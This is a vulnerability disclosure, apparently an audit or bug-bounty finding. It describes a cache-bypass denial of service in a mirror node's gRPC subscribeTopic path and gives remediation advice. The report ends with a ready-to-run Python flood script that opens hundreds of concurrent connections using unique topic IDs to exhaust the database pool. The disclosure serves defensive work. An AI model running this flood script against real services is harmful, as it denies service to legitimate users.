### Title
Unauthenticated Cache-Bypass DoS via Unique Non-Existent Entity IDs in `subscribeTopic` / `topicExists`

### Summary
Any unauthenticated gRPC client can call `subscribeTopic` with an unlimited supply of syntactically valid but non-existent `topicID` values. Because the entity-existence cache only stores results keyed by entity ID and an attacker can trivially rotate through the enormous valid ID space, every unique ID causes a synchronous (blocking) database query inside the reactive pipeline. Flooding the service with many concurrent connections—each carrying 5 parallel calls—exhausts the JDBC connection pool and renders the service unable to serve legitimate subscribers.

### Finding Description

**Code path:**

1. `ConsensusController.subscribeTopic()` (line 44) wraps `toFilter(request)` in `Mono.fromCallable` and chains it into `topicMessageService::subscribeTopic`.

2. `toFilter()` (lines 55–73) calls `EntityId.of(query.getTopicID())` → `EntityId.of(shard, realm, num)` → `encode()`. The only guard is a range check (shard ≤ 1023, realm ≤ 65535, num ≤ 274 877 906 943). Any in-range triple produces a valid `EntityId` and a valid `TopicMessageFilter` with no further validation.

3. `TopicMessageServiceImpl.topicExists()` (lines 94–106) executes:
   ```java
   Mono.justOrEmpty(entityRepository.findById(topicId.getId()))
   ```
   `entityRepository.findById()` is a **blocking** Spring Data JPA call. It is invoked **eagerly** (its return value is passed directly to `Mono.justOrEmpty`), so it runs synchronously on whatever thread is executing the reactive pipeline—not on a bounded-elastic scheduler.

4. `EntityRepository.findById()` (line 14–15) is annotated:
   ```java
   @Cacheable(cacheNames = CACHE_NAME, cacheManager = ENTITY_CACHE, unless = "#result == null")
   ```
   The cache manager is configured with `maximumSize=50000, expireAfterWrite=24h`. When an entity does not exist, `findById` returns `Optional.empty()`. Because `Optional.empty() != null`, the `unless` condition is **false** and the empty result **is** cached—but only for that specific entity ID. An attacker rotating through unique IDs produces a cache miss on every single request.

5. `NettyProperties.maxConcurrentCallsPerConnection = 5` (line 14) limits concurrency **per connection**, not across connections. There is no global connection cap or per-IP rate limit visible in the codebase.

**Root cause:** The failed assumption is that the Caffeine cache with `unless = "#result == null"` is sufficient to absorb abuse. It is not: the valid entity-ID space (~1.8 × 10¹⁷ combinations) is effectively unbounded, so an attacker can always present a fresh ID that misses the cache and forces a synchronous DB round-trip.

### Impact Explanation
Each cache-missing request holds a JDBC connection for the duration of the `SELECT` against the `entity` table. A typical HikariCP pool defaults to 10 connections. An attacker opening N connections × 5 concurrent calls = 5N simultaneous blocking DB queries. Once the pool is saturated, all subsequent `findById` calls—including those for legitimate, existing topics—queue indefinitely or time out. The gRPC service stops delivering topic messages to real subscribers, constituting a full service-level denial of service. Because the reactive pipeline is blocked on I/O threads, the Netty worker pool can also stall, amplifying the impact beyond just the DB layer.

### Likelihood Explanation
No authentication, no API key, no IP-based rate limit, and no per-client connection cap are required. A single attacker machine can open hundreds of gRPC connections (HTTP/2 multiplexed), each carrying 5 concurrent streams, and cycle through sequential `topicNum` values (0, 1, 2, …) that are guaranteed not to exist on a fresh or lightly-used network. The attack is trivially scriptable with any gRPC client library, requires no special knowledge of the network state, and is fully repeatable. The only natural friction is the 50 000-entry cache, which is filled and bypassed within the first 50 000 requests—a negligible warm-up cost.

### Recommendation

1. **Wrap the blocking DB call in a scheduler.** Replace the eager invocation with a truly lazy `Mono`:
   ```java
   Mono.fromCallable(() -> entityRepository.findById(topicId.getId()))
       .subscribeOn(Schedulers.boundedElastic())
   ```
   This prevents blocking Netty I/O threads and makes back-pressure visible.

2. **Add server-side rate limiting.** Implement a per-IP or per-connection token-bucket limiter in the gRPC interceptor layer before the call reaches `ConsensusController`.

3. **Add a global concurrent-subscriber cap.** Reject new subscriptions when `subscriberCount` exceeds a configurable threshold, returning `RESOURCE_EXHAUSTED` to the caller.

4. **Cache negative results more aggressively.** Change `unless = "#result == null"` to `unless = "false"` (or remove `unless` entirely) so that `Optional.empty()` is cached. This alone does not fix the attack (unique IDs still bypass it) but reduces the per-ID DB cost to one query per 24 hours.

5. **Validate the topic ID against a known-valid range or allowlist** before issuing any DB query, rejecting obviously synthetic IDs early in `toFilter()`.

### Proof of Concept

```python
import grpc
import threading
from hedera.mirror.api.proto import consensus_service_pb2_grpc
from hedera.mirror.api.proto import consensus_service_pb2
from hederahashgraph.api.proto.java import basic_types_pb2

TARGET = "mirror-node-grpc:5600"
CONNECTIONS = 200          # 200 connections × 5 streams = 1000 concurrent DB queries
CALLS_PER_CONN = 5

def flood(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    base = conn_id * 100_000
    futures = []
    for i in range(CALLS_PER_CONN):
        topic_num = base + i          # unique non-existent num per call
        query = consensus_service_pb2.ConsensusTopicQuery(
            topicID=basic_types_pb2.TopicID(shardNum=0, realmNum=0, topicNum=topic_num)
        )
        # subscribeTopic is a server-streaming RPC; just initiating it triggers topicExists()
        fut = stub.subscribeTopic(query)
        futures.append(fut)
    # drain errors (EntityNotFoundException) — we don't care, DB was already hit
    for f in futures:
        try: list(f)
        except: pass

threads = [threading.Thread(target=flood, args=(i,)) for i in range(CONNECTIONS)]
for t in threads: t.start()
for t in threads: t.join()
# After this loop the JDBC pool is saturated; legitimate subscribers receive no messages.
```

**Expected result:** JDBC pool exhausted; legitimate `subscribeTopic` calls for real topics time out or return `UNAVAILABLE`. Metrics show `hiero.mirror.grpc.subscribers` stuck at 0 for real clients while the DB connection wait queue grows.
